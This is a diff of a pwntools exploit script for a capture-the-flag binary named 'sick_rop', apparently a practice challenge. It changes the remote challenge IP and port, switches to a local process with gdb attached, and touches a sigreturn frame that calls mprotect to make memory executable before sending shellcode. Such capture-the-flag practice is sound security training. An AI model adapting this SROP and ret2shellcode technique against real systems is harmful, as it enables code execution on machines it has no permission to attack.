@@ -2,7 +2,7 @@ from pwn import *
 
 def exploit(boolean):
     if boolean:
-        r = remote('83.136.250.104', 46316)
+        r = remote('83.136.252.57', 37435)
     else:
         r = process('./sick_rop')
 
@@ -23,7 +23,7 @@ def exploit(boolean):
     frame.rdi = 0x400000        # starting with this address to change access protection
     frame.rsi = 0x2000          # Length of space that will change access protection
     frame.rdx = 0x7             # R(4) - W(2) - X(1) premissions
-    frame.rsp = 0x4010d8        # position of vuln() in stack - must be in the space that changed access protection
+    frame.rsp = 0x4010d8        # position of vuln() in stack - using "find 0x40102e" command in GDB
     frame.rip = syscall_gad     # syscall
 
     payload += bytes(frame)
@@ -31,8 +31,8 @@ def exploit(boolean):
     r.recv()
 
     r.sendline(b'B'* 14)        # calling sigreturn() to undo everything
-    r.recv()
-    # gdb.attach(r)
+    # r.recv()
+    gdb.attach(r)
 
     # RET2SHELLCODE
     #23 bytes
@@ -41,4 +41,4 @@ def exploit(boolean):
     r.sendline(payload)
     r.interactive()
 
-exploit(True)
+exploit(False)
